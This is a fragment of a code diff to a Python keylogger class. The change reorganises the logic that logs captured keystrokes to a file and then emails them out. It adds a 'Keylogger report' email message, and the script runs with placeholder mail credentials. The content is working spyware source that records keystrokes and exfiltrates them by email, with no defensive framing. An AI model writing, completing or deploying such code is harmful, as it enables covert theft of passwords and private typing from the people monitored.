@@ -42,9 +42,13 @@ class KeyLogger:
                 f.write(k)
                 f.write(' ')
             f.write('\n')
-            self.count = 0
-            self.send_mail(self.email,self.password)
-            self.keys = []
+        self.count = 0
+        self.send_mail(self.email,self.password)
+        self.keys = []
+        self.msg = MIMEMultipart()
+        self.msg['Subject'] = 'Keylogger report'
+        self.msg['From'] = self.email
+        self.msg['To'] = self.email
 
     def send_mail(self, email, password):
         with open(self.file, 'r') as f:
@@ -65,3 +69,4 @@ class KeyLogger:
 # Run keylogger
 pyLog = KeyLogger("YOUR MAIL","YOUR PASSWORD")
 pyLog.start()
+
